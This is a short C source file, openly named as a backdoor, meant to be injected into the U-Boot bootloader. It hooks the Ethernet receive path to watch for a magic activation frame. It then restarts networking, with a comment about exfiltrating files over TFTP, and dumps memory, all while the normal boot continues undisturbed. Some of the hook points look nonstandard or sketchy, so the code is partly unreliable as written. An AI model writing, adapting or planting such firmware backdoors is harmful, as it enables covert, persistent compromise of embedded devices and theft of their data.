/* u-boot_backdoor.c - Inject into U-Boot bootloader
 * Triggers on magic Ethernet frame, provides shell access
 */

#include <common.h>
#include <net.h>

#define MAGIC_SIGNATURE 0xDEADBEEF

// Hook into eth_rx() - called on every received packet
int eth_rx_hooked(void) {
    struct ethernet_hdr *eth = (struct ethernet_hdr *)NetRxPackets[0];
    uint32_t *magic = (uint32_t *)(eth + 1);  // After Ethernet header

    // Check for magic activation packet
    if (ntohs(eth->et_protlen) == 0x9999 && *magic == MAGIC_SIGNATURE) {
        printf("[BACKDOOR] Magic packet received, spawning shell...\n");

        // Start TFTP server for file exfiltration
        setenv("autoload", "no");
        NetStartAgain();

        // Drop to U-Boot shell (accessible via UART or network)
        run_command("md.b 0 100000", 0);  // Memory dump example

        return 0;  // Don't process packet further
    }

    // Call original handler
    return eth_rx_original();
}

// Inject point: Modify U-Boot's main_loop()
void main_loop_hooked(void) {
    // Replace eth_rx function pointer
    extern int (*eth_rx_ptr)(void);
    eth_rx_ptr = eth_rx_hooked;

    // Continue normal boot
    main_loop_original();
}
